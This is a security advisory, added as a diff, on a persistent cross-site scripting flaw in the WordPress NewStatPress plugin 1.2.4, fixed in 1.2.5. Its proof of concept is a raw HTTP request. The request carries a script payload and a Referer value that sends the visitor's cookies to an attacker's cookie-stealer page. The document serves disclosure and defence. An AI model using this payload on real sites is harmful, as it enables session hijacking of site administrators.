@@ -1,0 +1,48 @@
+Source: https://sumofpwn.nl/advisory/2016/persistent_cross_site_scripting_in_the_wordpress_newstatpress_plugin.html
+
+Abstract
+A persistent Cross-Site Scripting (XSS) vulnerability has been found in the WordPress NewStatPress plugin. By using this vulnerability an attacker can inject malicious JavaScript code into the application, which will execute within the browser of any user who views the relevant application content.
+
+Contact
+For feedback or questions about this advisory mail us at sumofpwn at securify.nl
+
+The Summer of Pwnage
+This issue has been found during the Summer of Pwnage hacker event, running from July 1-29. A community summer event in which a large group of security bughunters (worldwide) collaborate in a month of security research on Open Source Software (WordPress this time). For fun. The event is hosted by Securify in Amsterdam.
+
+OVE ID
+OVE-20160712-0030
+
+Tested versions
+This issue was successfully tested on WordPress NewStatPress plugin version 1.2.4.
+
+Fix
+This issue has been addressed in NewStatPress version 1.2.5. This version can be download from the NewStatPress GitHub account: https://github.com/lechab/newstatpress#125
+
+Introduction
+The WordPress NewStatPress plugin is a real-time plugin to manage the visits' statistics on a WordPress site. It doesn't require external web analytics. A persistent Cross-Site Scripting vulnerability has been discovered in the WordPress NewStatPress plugin which allows an unauthenticated attacker to inject malicious JavaScript code into the application, which will execute within the browser of any user who views the relevant application content. The attacker-supplied code can perform a wide variety of actions, such as stealing victims' session tokens or login credentials, performing arbitrary actions on their behalf, and logging their keystrokes or deliver malware.
+
+Details
+The WordPress NewStatPress plugin fails to sufficiently check input supplied to a GET request for a resource on a WordPress site with a vulnerable version of the NewStatPress plugin. In addition input supplied to the Referer header is insufficiently sanitized. As a result a malicious request will be stored on the Last Visitors and Visitors tab of the Visits page, executing the payload when an unsuspecting user views one of the mentioned tabs on this page.
+
+Persistent Cross-Site Scripting vulnerabilities are typically more serious than reflected vulnerabilities because they do not require a separate delivery mechanism in order to reach target users, in this case potentially a WP admin reviewing the stats.
+
+Proof of concept
+This vulnerability can be demonstrated by submitting the following request:
+
+GET /sumofpwn/"><script>alert(document.cookie);</script> HTTP/1.1
+Host: 192.168.28.129
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla Chrome/51.0.2704.103 Safari/537.36
+Referer: javascript:document.location=`http://www.XXXXXXyourhackerdomainXXXXXX.nl/demo/xss/cookiestealer.php?c=`+encodeURIComponent(document.cookie);
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Encoding: gzip, deflate, sdch
+Accept-Language: en-US,en;q=0.8,nl;q=0.6
+Connection: close
+
+Based on the above request, the vulnerable output will be:
+
+1) <a href="/?/sumofpwn/\"><script>alert(document.cookie);</script>" target="_blank">/sumofpwn/\"><script>alert(document.cookie);</script></a>
+2) Arrived from <a href="javascript:document.location=`http://www.sfylabs.nl/demo/xss/cookiestealer.php?c=`+encodeURIComponent(document.cookie);" target="_blank">javascript:document.location=`http://www.sfylabs.nl/demo/xss/cookiestealer.php?c=`+encodeURIComponent(document.cookie);</a>
+
+http://yourhost/wp-admin/admin.php?page=nsp_main
+http://yourhost/wp-admin/admin.php?page=nsp_visits
